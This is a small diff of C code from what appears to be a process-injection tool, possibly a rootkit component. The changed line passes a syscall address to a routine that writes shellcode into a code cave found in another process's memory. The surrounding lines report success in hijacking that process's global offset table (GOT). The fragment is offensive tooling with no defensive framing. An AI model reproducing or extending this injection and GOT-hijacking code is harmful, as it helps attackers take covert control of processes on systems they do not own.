@@ -53,7 +53,7 @@ int manage_injection(const struct rb_event* event){
             __u64 cave_addr = code_cave_find_address(mem_fd, from, to, flags, pgoff, major, minor, ino);
             if(cave_addr!=0){
                 //Found valid cave.
-                if(code_cave_write_shellcode(mem_fd, cave_addr, event->got_address, event->libc_malloc_address, event->libc_dlopen_mode_address)<0){
+                if(code_cave_write_shellcode(mem_fd, cave_addr, event->got_address, event->libc_malloc_address, event->libc_dlopen_mode_address, event->syscall_address)<0){
                     printf("Continuing with next cave candidate. Some writes might have been performed already\n");
                 }
                 printf("Successfully hijacked GOT\n");
